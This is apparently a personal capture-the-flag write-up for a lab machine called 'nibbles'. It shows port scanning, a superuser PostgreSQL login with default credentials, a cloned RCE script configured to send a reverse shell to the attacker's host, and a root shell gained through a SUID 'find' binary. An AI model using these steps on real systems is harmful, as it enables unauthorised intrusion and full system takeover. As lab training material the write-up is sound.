autorecon 192.168.228.47

```
PORT     STATE  SERVICE      REASON         VERSION
21/tcp   open   ftp          syn-ack ttl 61 vsftpd 3.0.3
22/tcp   open   ssh          syn-ack ttl 61 OpenSSH 7.9p1 Debian 10+deb10u2 
80/tcp   open   http         syn-ack ttl 61 Apache httpd 2.4.38 ((Debian))
139/tcp  closed netbios-ssn  reset ttl 61
445/tcp  closed microsoft-ds reset ttl 61
5437/tcp open   pmip6-data?  syn-ack ttl 61
```

port 21(ftp) - anonymous ftp failed

port 80(web) - feroxbuster nothing interesting. On webpage download nightmare.jpg and ran exiftools, steghide. Nothing.

port 5437 - **WOW. JUST WOW. NMAP DID NOT RECOGNISE THIS AS POSTGRES SQL. OTHER PEOPLE'S WRITEUP THE SCAN SHOWED BUT NOT MINE. WOW.**
Login with `postgres:postgres`.
```
┌──(kali㉿kali)-[~/offsec/nibbles]
└─$ psql -h 192.168.228.47 -p 5437 -U postgres
Password for user postgres: postgres

postgres=# \l
                                                     List of databases
   Name    |  Owner   | Encoding | Locale Provider |   Collate   |    Ctype    | Locale | ICU Rules |   Access privileges   
-----------+----------+----------+-----------------+-------------+-------------+--------+-----------+-----------------------
 postgres  | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | 
 template0 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
 template1 | postgres | UTF8     | libc            | en_US.UTF-8 | en_US.UTF-8 |        |           | =c/postgres          +
           |          |          |                 |             |             |        |           | postgres=CTc/postgres
(3 rows)
postgres-# \c template1
psql (18.4 (Debian 18.4-1), server 11.7 (Debian 11.7-0+deb10u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, compression: off, ALPN: none)
You are now connected to database "template1" as user "postgres".
template1-# \dt
Did not find any tables.
template1-# \du
                             List of roles
 Role name |                         Attributes                         
-----------+------------------------------------------------------------
 postgres  | Superuser, Create role, Create DB, Replication, Bypass RLS

```
We are superuser that means we can do nearly everything in database. We can get a reverse shell using copy method from postgresql which is described here:

```
git clone https://github.com/squid22/PostgreSQL_RCE

# Replace this in the python file with your own HOSTs
RHOST = '192.168.228.47'
RPORT = 5437
LHOST = '192.168.45.216'
LPORT = 80
USER = 'postgres'
PASSWD = 'postgres'
```
Reverse shell caught on penelope port 80.

## Privesc

List out SUID and capabilities. GTFObins has written how to use find command for shell if SUID is enabled.
```
postgres@nibbles:/home/wilson$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/su
/usr/bin/mount
/usr/bin/find
/usr/bin/sudo
/usr/bin/umount
postgres@nibbles:/home/wilson$ /usr/sbin/getcap -r / 2>/dev/null  
/usr/bin/ping = cap_net_raw+ep
postgres@nibbles:/home/wilson$ find . -exec /bin/sh -p \; -quit
#
```

Got root.